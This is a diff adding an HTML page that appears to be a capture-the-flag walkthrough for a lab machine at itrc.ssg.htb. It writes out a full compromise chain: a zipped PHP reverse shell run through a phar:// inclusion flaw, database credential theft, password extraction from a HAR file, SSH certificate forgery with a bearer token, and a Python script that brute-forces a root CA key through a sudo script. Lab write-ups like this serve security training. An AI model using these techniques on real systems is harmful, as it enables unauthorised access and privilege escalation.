@@ -1,0 +1,164 @@
+<!doctype html>
+<html>
+<head>
+<title>Resource</title>
+  <meta name="keywords" content="Put your name, skills and some coding keywords" />
+  <link rel="stylesheet" href="index.css" />
+</head>
+<body>
+<h1>WWW-DATA<h1>
+<br>
+<h2>Lets look at First at the scans with nmap</h2>
+<br>
+<h3>sudo nmap -sC -sV --min-rate=1000 10.10.11.27
+</h3>
+<br>
+<h4> Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 00:47 CEST<br>
+Nmap scan report for 10.10.11.27<br>
+Host is up (0.023s latency).<br>
+Not shown: 997 closed tcp ports (reset)<br>
+PORT     STATE SERVICE VERSION<br>
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)<br>
+| ssh-hostkey: <br>
+|   256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA)<br>
+|_  256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519)<br>
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)<br>
+|_http-server-header: nginx/1.18.0 (Ubuntu)<br>
+|_http-title: Did not follow redirect to http://itrc.ssg.htb/<br>
+2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)<br>
+| ssh-hostkey: <br>
+|   256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA)<br>
+|_  256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519)<br>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br>
+<br>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>
+Nmap done: 1 IP address (1 host up) scanned in 8.35 seconds<br>
+</h4>
+<br> 
+<h2>If we look at the scan we can see 2 ssh ports, one port is 22 and the other one is 2222. The scan also includes the port 80 http which means that the IP has a WEB-Interface.<h2>
+<img src="./images/1.png">
+
+<h2>It looks like we have to register and log in.</h2>
+<img src="./images/2.png">
+
+<h2>We could try to fuzz the url, but that will lead us to a rabbit hole. Lets take a look at creating a new ticket.
+<h2>
+<img src="./images/3.png">
+<h2> We can create a zip folder with a reverse shell .</h2>
+<img src="./images/4.png">
+<h2>After some raesearching I was able to find a <a> phar vulnerability </a> in url, which allows us to uzip the folder, the unziping is something like this: <br> <p>http://itrc.ssg.htb/?page=phar://uploads/941bb3bc0d151e5b6112c0ffe21cf565fab6b134.zip/shell<p> <br>
+
+<p>where shell is the name of the php code to run (i.e. shell.php in the zip file). </p><br>(You can get the zip file name by right clickimg it and selecting the option "Open Link in New Tab"   )</h2>
+<img src="./images/6.png">
+<img src="./images/5.png">
+<br><br>
+<h1>msainristil@itrc</h1>
+<h2>Upgrade your shell now with:  SHELL=/bin/bash script -q /dev/null</h2>
+<img src="./images/7.png">
+<h2>If you are going to change directory to /var/www/itrc, you will be able to find a db.php file which contains the credential for mysql database and connect to it.</h2><br>
+<h3>mysql -u jj -h db -p</h3>
+<img src="./images/8.png">
+<h2>Inspect mysqldb:</h2>
+<br>
+<h3>show databases; <br> use resourcecenter <br> show tables; <br> select * from messages; <br> select * from tickets;</h3>
+<img src="./images/9.png">
+<img src="./images/10.png">
+<h2>Extract now the data with curl and unzip them: <br></h2>
+<h3>curl http://itrc.ssg.htb/uploads/c2f4813259cc57fab36b311c5058cf031cb6eb51.zip -o file.zip<br> curl http://itrc.ssg.htb/uploads/e8c6575573384aeeab4d093cc99c7e5927614185.zip -o file2.zip <br> curl http://itrc.ssg.htb/uploads/eb65074fe37671509f24d1652a44944be61e4360.zip  -o file3.zip
+</h3>
+<img src="./images/11.png">
+<h2>You should have a file named itrc.ssg.htb.har read now its password:</h2>
+<h3><br>cat itrc.ssg.htb.har | grep -A 1 -B 1 -E "(pass=)<h3>
+<img src="./images/12.png">
+<h2>You should now connect to ssh with the password<h2>
+<h1>root@itrc</h1>
+<h2>Change Diretory to decommission_old_ca and generate the ssh for root:</h2>
+<br>
+<h3>ssh-keygen -t rsa -b 4096 -C "root@itrc"<br>ssh-keygen -t rsa -b 4096 -f id_rsa<br>ssh-keygen -s ca-itrc -I "root" -n root -V +52w id_rsa.pub<br>chmod 600 id_rsa<br>chmod 600 id_rsa-cert.pub<br>ssh -v -i id_rsa -i id_rsa-cert.pub root@localhost</h3>
+<img src="./images/13.png">
+<img src="./images/14.png">
+<img src="./images/16.png">
+<h2>You can find the flag at /home/zzinter </h2>
+<h1>support@ssg</h1>
+<br>
+<h2>Change Directory to /home/zzinter and create a ssh key for support@ssg on port 2222:</h2>
+<h3>ssh-keygen -f mgraham 
+<br>bash sign_key_api.sh mgraham.pub support support > mgraham.cert
+<br>chmod 600 mgraham
+<br>ssh -i mgraham -o CertificateFile=mgraham.cert support@10.129.178.254 -p2222</h3>
+<h1>zzinter@ssg</h1>
+<h2>After Fuzzin for subdomain we can find signserv.ssg.htb wich leads use to an api endpoint http://signserv.ssg.htb/v1/sign<br><h2>
+<h2>After analyzing it i could create a .sh script wich leads us to zzinter account.</h2>
+<h4>#!/bin/bash
+<br><br>
+# Generate SSH key pair<br>
+ssh-keygen -t rsa -b 2048 -f key -N "" && chmod 600 key<br><br>
+
+# Extract the public key<br>
+PUB_KEY=$(cat key.pub)<br>
+<br>
+<br># Make the API call to sign the key
+<br>curl -X 'POST' \
+  <br>'http://signserv.ssg.htb/v1/sign' \
+  <br>-H 'accept: text/plain' \
+  <br>-H 'Content-Type: application/json' \
+  <br>-H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE" \
+  <br>-d "{
+  <br>\"pubkey\": \"$PUB_KEY\",
+  <br>\"principals\": \"zzinter_temp\",
+  <br>\"username\": \"zzinter\"
+<br>}" \
+<br>> key-cert.pub && \
+<br>chmod 600 key-cert.pub
+<br>
+<br># Log in with cert
+<br>ssh -o CertificateFile=key-cert.pub -i key zzinter@10.10.11.27 -p 2222
+</h4>
+<h1>root@ssg<h1>
+<h2>If we type sudo -l we can see /opt/sign_key.sh, at first we will creat a user key (ssh-keygen -t rsa -b 4096 -f xpl) and then we will brute force it with a python scritp:</h2>
+<h4><br>import subprocess
+<br>
+<br>
+<br># SSH key elements
+<br>header = "-----BEGIN OPENSSH PRIVATE KEY-----"
+<br>footer = "-----END OPENSSH PRIVATE KEY-----"
+<br>ba64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
+<br>key = []
+<br>line= 0
+<br>
+<br>
+<br># Iterates over each character to test if it's the next correct one
+<br>while True:
+<br>    for char in ba64chars:
+    <br>	# Constructs a test key with *
+    <br>    testKey = f"{header}\n{''.join(key)}{char}*"
+    <br>    with open("ca-test", "w") as f:
+    <br>        f.write(testKey)
+    <br>    proc = subprocess.run(
+    <br>        ["sudo", "/opt/sign_key.sh", "ca-test", "xpl.pub", "root", "root_user", "1"],
+    <br>        capture_output=True
+    <br>    )
+    <br>    
+    <br>    # If matched, Error code 1
+<br>        if proc.returncode == 1:
+    <br>        key.append(char)
+    <br>        # Adds a newline every 70 characters
+    <br>        if len(key) > 1 and (len(key) - line) % 70 == 0:
+    <br>            key.append("\n")
+    <br>            line += 1
+    <br>        break
+    <br>else:
+    <br>    break
+<br>
+<br># Constructs the final SSH key from the discovered characters
+<br>caKey = f"{header}\n{''.join(key)}\n{footer}"
+<br>print("The final leaked ca-it is: ", caKey)
+<br>with open("ca-it", "w") as f:
+<br>    f.write(caKey) 
+</h4>
+<h2>You will have too wait 10 minutes and at the end type:</h2>
+<h3>ssh-keygen -s ca-it -z 1234 -I root -V -100w:forever -n root_user rootKey.pub <br>
+ssh -o CertificateFile=rootKey-cert.pub -i rootKey root@localhost -p 2222 <br><h3/>
+<h1>Happy Hacking!</h1>
+</body>
+</html>
